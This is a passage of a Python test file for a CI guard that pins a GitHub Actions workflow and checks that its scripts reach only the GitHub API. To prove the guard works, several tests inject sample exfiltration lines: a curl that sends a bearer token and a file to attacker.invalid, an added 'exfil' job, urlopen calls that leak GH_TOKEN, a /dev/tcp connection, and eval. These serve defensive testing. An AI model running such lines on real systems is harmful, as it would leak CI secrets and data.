        found.append("API is not the one allowed GitHub API host")
    urls = [
        n.value
        for n in ast.walk(tree)
        if isinstance(n, ast.Constant) and isinstance(n.value, str) and "://" in n.value
    ]
    if urls != ["https://api.github.com"]:
        found.append("URL constants are not exactly the GitHub API host")
    return found


SCRIPTS_RUN_BY_THE_JOB = ("read-lock.sh", "verify-history-rewrite.sh")


def test_the_workflow_matches_the_pinned_step_table() -> None:
    assert workflow_problems(workflow()) == []


def test_the_script_reaches_only_the_github_api_and_runs_only_git_and_bash() -> None:
    assert script_problems(GUARD_PY.read_text(encoding="utf-8")) == []


@pytest.mark.parametrize("name", SCRIPTS_RUN_BY_THE_JOB)
def test_the_shell_scripts_the_job_runs_reach_nothing(name: str) -> None:
    text = (TEMPLATE / "scripts" / name).read_text(encoding="utf-8")
    # The wrapper runs the engine image with docker or podman. The runtime is
    # allowed only here, and only with the network switched off for the run.
    runtimes = (
        frozenset({"docker", "podman"}) if name.startswith("verify") else frozenset()
    )
    assert shell_problems(text, name, runtimes) == []
    if runtimes:
        run_lines = [ln for ln in text.splitlines() if '"$runtime" run' in ln]
        assert run_lines
        assert all("--network none" in ln for ln in run_lines)
        assert text.count("--network") == len(run_lines)


def mutated(edit: Any) -> dict[Any, Any]:
    data = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    edit(data)
    return data  # type: ignore[no-any-return]


def guard_step(data: dict[Any, Any]) -> dict[str, Any]:
    step: dict[str, Any] = data["jobs"]["history-guard"]["steps"][-1]
    return step


def test_a_curl_step_in_the_token_step_is_caught() -> None:
    def edit(data: dict[Any, Any]) -> None:
        guard_step(data)["run"] += (
            '\ncurl -fsS -H "Authorization: Bearer $GH_TOKEN"'
            " --data-binary @pr/history/social.jsonl https://attacker.invalid/x"
        )

    problems = workflow_problems(mutated(edit))
    assert any("Guard the history file: changed" in p for p in problems)
    assert any("network command curl" in p for p in problems)
    assert any("attacker.invalid" in p for p in problems)


def test_a_new_step_and_a_second_job_are_caught() -> None:
    def add_step(data: dict[Any, Any]) -> None:
        data["jobs"]["history-guard"]["steps"].append({"name": "Extra", "run": "ls"})

    assert any("not in STEP_TABLE" in p for p in workflow_problems(mutated(add_step)))

    def add_job(data: dict[Any, Any]) -> None:
        data["jobs"]["exfil"] = {
            "runs-on": "ubuntu-latest",
            "steps": [{"run": "curl https://attacker.invalid"}],
        }

    problems = workflow_problems(mutated(add_job))
    assert any("job exfil: not an expected job" in p for p in problems)
    assert any("exfil/" in p and "curl" in p for p in problems)


def test_a_changed_run_text_or_pin_is_caught_by_name() -> None:
    def run_text(data: dict[Any, Any]) -> None:
        for step in data["jobs"]["history-guard"]["steps"]:
            if step.get("id") == "trust":
                step["run"] = step["run"].replace("chmod -R a-w", "chmod -R a+w")

    assert any(
        "Install the trusted copies and choose the engine image: changed" in p
        for p in workflow_problems(mutated(run_text))
    )

    def pin(data: dict[Any, Any]) -> None:
        step = data["jobs"]["history-guard"]["steps"][0]
        step["uses"] = step["uses"][:-1] + "0"

    assert any("Fetch the trusted files" in p for p in workflow_problems(mutated(pin)))

    def other_action(data: dict[Any, Any]) -> None:
        data["jobs"]["history-guard"]["steps"][0]["uses"] = "evil/action@" + "a" * 40

    assert any("is not allowed" in p for p in workflow_problems(mutated(other_action)))


def test_a_url_in_an_action_input_and_other_network_forms_are_caught() -> None:
    for text in (
        "wget https://api.github.com/x",
        "python3 -c 'print(1)'",
        "git fetch origin",
        "exec 3<>/dev/tcp/1.2.3.4/80",
        "gh api /repos/x/y",
        "echo http://api.github.com.evil.example/x",
    ):
        assert shell_problems(text, "t"), text
    assert shell_problems("# curl https://evil.example\necho ok", "t") == []
    assert shell_problems('python3 -I "$TRUSTED/scripts/history-guard.py"', "t") == []


GUARD_SOURCE = GUARD_PY.read_text(encoding="utf-8")


@pytest.mark.parametrize(
    ("old", "new", "expect"),
    [
        (
            "with urllib.request.urlopen(request, timeout=30) as reply:",
            'with urllib.request.urlopen("https:" + "//attacker.invalid/?t="'
            ' + os.environ["GH_TOKEN"], timeout=30) as reply:',
            "urlopen is not called",
        ),
        (
            '    url = f"{API}{path}"\n',
            '    url = "https:" + "//attacker.invalid" + path\n',
            "url is assigned",
        ),
        ("import tempfile\n", "import tempfile\nimport socket\n", "socket"),
        ("import tempfile\n", "import tempfile\nimport requests\n", "requests"),
        (
            "import urllib.request\n",
            "import urllib.request\nimport http.client\n",
            "http.client",
        ),
        ('["git", "-C", str(pr), *args]', '["curl", str(pr), *args]', "not fixed"),
        ('API = "https://api.github.com"', 'API = "https://attacker.invalid"', "API"),
        ("def env(", "def env2(*a):\n    return eval(a[0])\n\n\ndef env(", "eval"),
        (
            "urllib.request.urlopen(request",
            "urllib.request.build_opener(request",
            "build_opener",
        ),
        (
            'f"/repos/{repo}/git/ref/heads/main"',
            'f"@attacker.invalid/{repo}/git/ref/heads/main"',
            "api_get path",
        ),
    ],
)
def test_the_script_checks_bite_on_each_network_mutation(
    old: str, new: str, expect: str
) -> None:
    assert old in GUARD_SOURCE, old
    problems = script_problems(GUARD_SOURCE.replace(old, new, 1))
    assert any(expect in p for p in problems), (expect, problems)


def table_rows() -> str:
    rows = []
    for step in workflow()["jobs"]["history-guard"]["steps"]:
        kind = step["uses"] if "uses" in step else "run"
        rows.append(f"    ({step['name']!r}, {kind!r}, {step_digest(step)!r}),")
    return "\n".join(rows)


if __name__ == "__main__":
    print("STEP_TABLE rows for the current workflow:")
    print(table_rows())
